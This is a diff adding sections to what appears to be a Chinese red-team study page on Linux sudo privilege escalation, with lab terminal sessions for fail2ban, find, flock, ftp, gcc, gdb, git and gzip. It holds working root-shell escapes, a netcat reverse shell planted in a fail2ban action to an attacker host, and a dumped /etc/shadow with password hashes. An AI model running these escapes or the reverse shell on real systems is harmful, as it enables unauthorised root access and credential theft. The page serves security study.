@@ -2040,6 +2040,380 @@
 </span></span><span style="display:flex;"><span>root@RedteamNotes:/home/jackie# whoami
 </span></span><span style="display:flex;"><span>root
 </span></span></code></pre></div><p><code>expect</code> 能模拟用户的键盘输入，恶意命令以 <code>root</code> 身份在新的 <code>shell</code> 进程中开启了一个交互式会话。<code>-c</code> 允许在命令行中输入 <code>expect</code> 脚本代码，而不是从文件中读取。</p>
+<h3 id="sudo-fail2ban">sudo fail2ban</h3>
+<p>查看无需密码即可以 sudo 身份执行的命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo -l                    
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> jackie on localhost:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,      
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>User jackie may run the following commands on localhost:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/fail2ban
+</span></span></code></pre></div><p>发现可以无需密码执行 <code>/usr/bin/fail2ban</code> 命令，查找 <code>fail2ban</code> 的配置文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ find / -name fail2ban -type d 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/share/doc/fail2ban
+</span></span><span style="display:flex;"><span>/usr/lib/python3/dist-packages/fail2ban
+</span></span><span style="display:flex;"><span>/run/fail2ban
+</span></span><span style="display:flex;"><span>/var/lib/fail2ban
+</span></span><span style="display:flex;"><span>/etc/fail2ban
+</span></span></code></pre></div><p>进一步查找可写文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ find /etc -writable -type d 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/etc/fail2ban/action.d
+</span></span><span style="display:flex;"><span>jackie@RedteamNotes:~$ ls -liah /etc/fail2ban
+</span></span><span style="display:flex;"><span>total 72K
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">394975</span> drwxr-xr-x   <span style="color:#ae81ff">6</span> root root   4.0K May <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2023</span> .
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">393218</span> drwxr-xr-x <span style="color:#ae81ff">117</span> root root   4.0K May <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2023</span> ..
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">394976</span> drwxrwx---   <span style="color:#ae81ff">2</span> root jackie 4.0K May <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2023</span> action.d
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">395040</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root root   2.8K Nov <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> fail2ban.conf
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">395041</span> drwxr-xr-x   <span style="color:#ae81ff">2</span> root root   4.0K Mar <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2022</span> fail2ban.d
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">395042</span> drwxr-xr-x   <span style="color:#ae81ff">3</span> root root   4.0K May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2023</span> filter.d
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">442894</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root root    25K May <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2023</span> jail.conf
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">395137</span> drwxr-xr-x   <span style="color:#ae81ff">2</span> root root   4.0K May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2023</span> jail.d
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">395139</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">645</span> Nov <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> paths-arch.conf
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">395140</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root root   2.8K Nov <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> paths-common.conf
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">395141</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">650</span> Mar <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2022</span> paths-debian.conf
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">395142</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">738</span> Nov <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> paths-opensuse.conf
+</span></span></code></pre></div><p><code>fail2ban</code> 的规则文件夹可写，通过下面办法使其可以编辑</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ackie@RedteamNotes:/etc/fail2ban/action.d$ ls -liah iptables-multiport.conf
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">394582</span> -rw-r--r-- <span style="color:#ae81ff">1</span> root root 1.5K May <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2023</span> iptables-multiport.conf
+</span></span><span style="display:flex;"><span>jackie@RedteamNotes:/etc/fail2ban/action.d$ mv iptables-multiport.conf iptables-multiport.conf.bak
+</span></span><span style="display:flex;"><span>mv: replace <span style="color:#e6db74">&#39;iptables-multiport.conf.bak&#39;</span>, overriding mode <span style="color:#ae81ff">0644</span> <span style="color:#f92672">(</span>rw-r--r--<span style="color:#f92672">)</span>? 
+</span></span><span style="display:flex;"><span>jackie@RedteamNotes:/etc/fail2ban/action.d$ 
+</span></span><span style="display:flex;"><span>jackie@RedteamNotes:/etc/fail2ban/action.d$ cp iptables-multiport.conf.bak iptables-multiport.conf
+</span></span><span style="display:flex;"><span>jackie@RedteamNotes:/etc/fail2ban/action.d$ 
+</span></span><span style="display:flex;"><span>jackie@RedteamNotes:/etc/fail2ban/action.d$ ls -liah iptables-multiport.conf
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">394582</span> -rw-r--r-- <span style="color:#ae81ff">1</span> jackie jackie 1.5K Jan <span style="color:#ae81ff">17</span> 15:43 iptables-multiport.conf
+</span></span><span style="display:flex;"><span>jackie@RedteamNotes:/etc/fail2ban/action.d$ chmod <span style="color:#ae81ff">666</span> iptables-multiport.conf
+</span></span><span style="display:flex;"><span>jackie@RedteamNotes:/etc/fail2ban/action.d$ ls -liah iptables-multiport.conf
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">394582</span> -rw-rw-rw- <span style="color:#ae81ff">1</span> jackie jackie 1.5K Jan <span style="color:#ae81ff">17</span> 15:43 iptables-multiport.conf
+</span></span></code></pre></div><p><code>mv</code> 移动文件所有者不变仍为 <code>root</code>，<code>cp</code> 复制文件，新文件所有者变为 <code>jackie</code>。编辑文件放入 反弹 <code>shell</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:/etc/fail2ban/action.d$ ls -liah iptables-multiport.conf
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">394582</span> -rw-rw-rw- <span style="color:#ae81ff">1</span> jackie jackie 1.5K Jan <span style="color:#ae81ff">17</span> 15:43 iptables-multiport.conf
+</span></span><span style="display:flex;"><span>jackie@RedteamNotes:/etc/fail2ban/action.d$ vim iptables-multiport.conf
+</span></span><span style="display:flex;"><span>jackie@RedteamNotes:/etc/fail2ban/action.d$ cat iptables-multiport.conf | grep <span style="color:#e6db74">&#39;actionban&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Notes.:  command executed once before each actionban command</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Option:  actionban</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># actionban = &lt;iptables&gt; -I f2b-&lt;name&gt; 1 -s &lt;ip&gt; -j &lt;blocktype&gt;</span>
+</span></span><span style="display:flex;"><span>actionban <span style="color:#f92672">=</span> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.10.5 <span style="color:#ae81ff">9595</span> &gt;/tmp/f
+</span></span></code></pre></div><p>使用 <code>sudo</code> 权限重启 <code>fail2ban</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:/etc/fail2ban/action.d$ sudo /etc/init.d/fail2ban restart
+</span></span><span style="display:flex;"><span>Restarting fail2ban <span style="color:#f92672">(</span>via systemctl<span style="color:#f92672">)</span>: fail2ban.service.
+</span></span></code></pre></div><p>在 <code>kali</code> 中建立监听，然后快速使用空密码登入 <code>jackie</code>。</p>
+<p><img src="Pasted%20image%2020260118180538.png" alt=""></p>
+<h3 id="sudo-find">sudo find</h3>
+<p>查看无需密码即可以 sudo 身份执行的命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo -l                    
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> jackie on localhost:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,      
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>User jackie may run the following commands on localhost:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/find
+</span></span></code></pre></div><p>发现可以无需密码执行 <code>/usr/bin/find</code> 命令，执行提权命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo find . -exec /bin/bash <span style="color:#ae81ff">\;</span> -quit
+</span></span><span style="display:flex;"><span>root@RedteamNotes:/home/jackie# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>解释一下命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo find . -exec /bin/bash <span style="color:#ae81ff">\;</span> -quit
+</span></span></code></pre></div><p>这个命令不是查找逻辑，<code>/bin/bash</code> 不会对找到的文件或目录进行任何处理，而 <code>-quit</code> 又会在找到第一个文件或目录后就使 <code>find</code> 命令停止。这个命令的使命就是新起一个 <code>shell</code>。</p>
+<p><code>\;</code> 则是 <code>-exec</code> 参数的结束符，告诉 <code>find</code> 命令 <code>-exec</code> 参数的内容到此为止。需要注意的是 <code>-exec</code> 命令后面的 <code>\;</code> 必须被转义（即加上 <code>\</code>），否则 <code>shell</code> 会将 <code>;</code> 解释为命令分隔符，导致 <code>-exec</code> 参数没有正确的结束，从而引发错误。因此我们需要携程 <code>\;</code>，而不是单独的 <code>;</code>。</p>
+<h3 id="sudo-flock">sudo flock</h3>
+<p>查看无需密码即可以 sudo 身份执行的命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo -l                    
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> jackie on localhost:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,      
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>User jackie may run the following commands on localhost:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/flock
+</span></span></code></pre></div><p>发现可以无需密码执行 <code>/usr/bin/flock</code> 命令，执行提权命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo flock -u / /bin/bash
+</span></span><span style="display:flex;"><span>root@RedteamNotes:/home/jackie# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p><code>flock</code> 是一个在 Linux 中管理文件锁定的实用程序。它可以用来协调多个进程对文件或文件系统的访问，避免这些进程同时访问同一资源导致的问题。<code>-u</code> 是 <code>flock</code> 的选项，表示解锁，这个命令的含义就是以管理员权限来解锁对根目录的锁定，以 <code>bash shell</code> 来执行这个操作。</p>
+<h3 id="sudo-ftp">sudo ftp</h3>
+<p>查看无需密码即可以 sudo 身份执行的命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo -l                    
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> jackie on localhost:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,      
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>User jackie may run the following commands on localhost:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/ftp
+</span></span></code></pre></div><p>发现可以无需密码执行 <code>/usr/bin/ftp</code> 命令，执行提权命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo ftp
+</span></span><span style="display:flex;"><span>ftp&gt; !/bin/bash
+</span></span><span style="display:flex;"><span>root@RedteamNotes:/home/jackie# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p><code>!</code> 在这里是一个特殊字符，表示要暂时离开 <code>FTP</code> 会话并在本地 <code>shell</code> 中执行命令。<code>!</code> 的这个用法在 <code>vi</code>、<code>ed</code> 等编辑器下也存在，可以总结为一种通用做法。</p>
+<h3 id="sudo-gcc">sudo gcc</h3>
+<p>查看无需密码即可以 sudo 身份执行的命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo -l                    
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> jackie on localhost:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,      
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>User jackie may run the following commands on localhost:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/gcc
+</span></span></code></pre></div><p>发现可以无需密码执行 <code>/usr/bin/gcc</code> 命令，执行提权命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo gcc -wrapper /bin/bash,-s .
+</span></span><span style="display:flex;"><span>root@RedteamNotes:/home/jackie# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><ul>
+<li><code>-wrapper</code> 是 <code>gcc</code> 的一个选项，它允许在 <code>gcc</code> 调用实际编译器或链接器之前，先调用一个包装器（wrapper）脚本或程序。</li>
+<li><code>,-s</code> 是一个 <code>bash</code> 带的一个选项，它使得 <code>bash</code> 在读取到 <code>EOF</code> 时不会退出。</li>
+<li>最后的 <code>.</code> 时编译的源码，给任意源码均可，如果不想编译任何东西可以打包当前目录，即 <code>.</code>。</li>
+</ul>
+<h3 id="sudo-gdb">sudo gdb</h3>
+<p>查看无需密码即可以 sudo 身份执行的命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo -l                    
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> jackie on localhost:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,      
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>User jackie may run the following commands on localhost:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/gdb
+</span></span></code></pre></div><p>发现可以无需密码执行 <code>/usr/bin/gdb</code> 命令，执行提权命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo gdb -nx -ex <span style="color:#e6db74">&#39;!/bin/bash&#39;</span> -ex quit
+</span></span><span style="display:flex;"><span>GNU gdb <span style="color:#f92672">(</span>Ubuntu 12.1-0ubuntu1~22.04<span style="color:#f92672">)</span> 12.1
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2022</span> Free Software Foundation, Inc.
+</span></span><span style="display:flex;"><span>License GPLv3+: GNU GPL version <span style="color:#ae81ff">3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
+</span></span><span style="display:flex;"><span>This is free software: you are free to change and redistribute it.
+</span></span><span style="display:flex;"><span>There is NO WARRANTY, to the extent permitted by law.
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;show copying&#34;</span> and <span style="color:#e6db74">&#34;show warranty&#34;</span> <span style="color:#66d9ef">for</span> details.
+</span></span><span style="display:flex;"><span>This GDB was configured as <span style="color:#e6db74">&#34;x86_64-linux-gnu&#34;</span>.
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;show configuration&#34;</span> <span style="color:#66d9ef">for</span> configuration details.
+</span></span><span style="display:flex;"><span>For bug reporting instructions, please see:
+</span></span><span style="display:flex;"><span>&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
+</span></span><span style="display:flex;"><span>Find the GDB manual and other documentation resources online at:
+</span></span><span style="display:flex;"><span>    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>For help, type <span style="color:#e6db74">&#34;help&#34;</span>.
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;apropos word&#34;</span> to search <span style="color:#66d9ef">for</span> commands related to <span style="color:#e6db74">&#34;word&#34;</span>.
+</span></span><span style="display:flex;"><span>root@RedteamNotes:/home/jackie# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><ol>
+<li><code>-nx</code>：no execute 这个选项告诉 <code>gdb</code> 在启动时不读取任何 <code>.gdbinit</code> 文件，<code>.gdbinit</code> 文件时一个配置文件，<code>gdb</code> 在启动时会读取这个文件中的命令。</li>
+<li><code>-ex</code>：execute 这选项允许在 <code>gdb</code> 启动时执行一段 <code>gdb</code> 命令。</li>
+<li><code>!bash</code>：在 <code>gdb</code> 中，<code>!</code> 用来执行 <code>shell</code> 命令，因此 <code>!bash</code> 时在 <code>gdb</code> 中启动一个 <code>bash shell</code> 。</li>
+<li><code>-ex quit</code>：在执行完前面的命令后退出。</li>
+</ol>
+<h3 id="sudo-git">sudo git</h3>
+<p>查看无需密码即可以 sudo 身份执行的命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo -l                    
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> jackie on localhost:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,      
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>User jackie may run the following commands on localhost:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/git
+</span></span></code></pre></div><p>发现可以无需密码执行 <code>/usr/bin/git</code> 命令，执行提权命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo git branch --help
+</span></span><span style="display:flex;"><span>!/bin/bash
+</span></span><span style="display:flex;"><span>root@RedteamNotes:/home/jackie# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p><code>branch</code> 是 <code>git</code> 的一个子命令，用于处理代码库中的分支。可以使用 <code>git branch</code> 创建、列出、删除分支。</p>
+<h3 id="sudo-gzipgunzip">sudo gzip/gunzip</h3>
+<p>查看无需密码即可以 sudo 身份执行的命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo -l                    
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> jackie on localhost:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,      
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>User jackie may run the following commands on localhost:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/gunzip
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/gzip
+</span></span></code></pre></div><p>发现可以无需密码执行 <code>/usr/bin/gzip</code> 命令，执行提权命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo gzip -c /etc/shadow | gzip -d
+</span></span><span style="display:flex;"><span>root:$6$1mokVIOR1y0hKn2n$.ImQujW12YEC4sMF7IQcUQmLStAQHuByyNhVIiEzvF/SQx3nBMPBFi4xQ40sp80V6ivaJEAy/0n23TsTi.AnO.:19495:0:99999:7:::
+</span></span><span style="display:flex;"><span>daemon:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>bin:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>sys:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>sync:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>games:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>man:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>lp:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>mail:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>news:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>uucp:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>proxy:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>www-data:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>backup:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>list:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>irc:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>gnats:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>nobody:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>_apt:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>systemd-network:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>systemd-resolve:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>messagebus:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>systemd-timesync:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>pollinate:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>sshd:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>syslog:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>uuidd:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>tcpdump:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>tss:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>landscape:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>fwupd-refresh:*:19405:0:99999:7:::
+</span></span><span style="display:flex;"><span>usbmux:*:19467:0:99999:7:::
+</span></span><span style="display:flex;"><span>jack:$6$AQNi8FXirbH0UTEj$qFvuV86Nt0rLBUIIzD7lNwBsXAs0Pe.RkeGCdL6WAx7F/dnpMNlWnbtaxrGWLnFriYIssY2APvQoSuaPvHEkc.:19467:0:99999:7:::
+</span></span><span style="display:flex;"><span>lxd:!:19467::::::
+</span></span><span style="display:flex;"><span>jackie:$y$j9T$HGogdG4n7G1yXJqpQGvoS/$In6/ABIDki2EGI5fEDDVdWNaVBpoBqWE.mpRK45htg1:19495:0:99999:7:::
+</span></span><span style="display:flex;"><span>mysql:!:19494:0:99999:7:::
+</span></span></code></pre></div><p>后续可参考可读 shadow 文件提权。</p>
+<h3 id="sudo-hping3">sudo hping3</h3>
+<p>查看无需密码即可以 sudo 身份执行的命令。</p>
